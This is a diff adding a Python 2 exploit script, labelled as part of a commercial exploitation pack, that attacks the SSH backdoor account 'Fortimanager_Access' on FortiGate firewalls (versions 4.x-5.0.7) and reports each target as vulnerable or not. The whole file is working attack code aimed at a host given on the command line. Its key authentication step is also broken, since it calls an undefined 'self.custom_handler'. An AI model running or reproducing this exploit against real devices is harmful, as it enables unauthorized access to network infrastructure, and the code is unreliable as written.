@@ -1,0 +1,60 @@
+#! /usr/bin/env python2
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2017
+#
+
+
+###
+# STD modules
+###
+import os, sys, re
+try:
+  import paramiko
+except:
+  print 'No module paramiko'
+  sys.exit()
+
+_name_   = 'd2sec_fortinet_1'
+_vendor_ = 'fortinet'
+_model_  = ['FortiGate OS Version 4.x-5.0.7']
+_vuln_   = 'OS Backdoor Vulnerability'
+_cve_    = ''
+_ref_    = ''
+_port_   = 22
+
+def pwnrouter(host):
+    print '[#] Host : %s'  %host
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try:
+      client.connect(host, 22, username='', allow_agent=False, look_for_keys=False)
+    except paramiko.ssh_exception.SSHException:
+      pass
+    except:
+      print '[-] Exploit failed, SSH service is down'
+      print '[-] %s is not vulnerable' % host
+      return
+    trans = client.get_transport()
+    try:
+      trans.auth_password(username='Fortimanager_Access', password='', event=None, fallback=True)
+    except paramiko.ssh_exception.AuthenticationException:
+      pass
+    except:
+      print '[-] Error with existing session. Wait few minutes.'
+      print '[-] %s is not vulnerable' % host
+      return
+    try:
+      trans.auth_interactive(username='Fortimanager_Access', handler=self.custom_handler)
+      print '[+] Exploit succeeded, %s is vulnerable' % host
+      client.close()
+    except:
+      print '[-] Exploit failed, %s is not vulnerable' % host
+      return
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1])
+
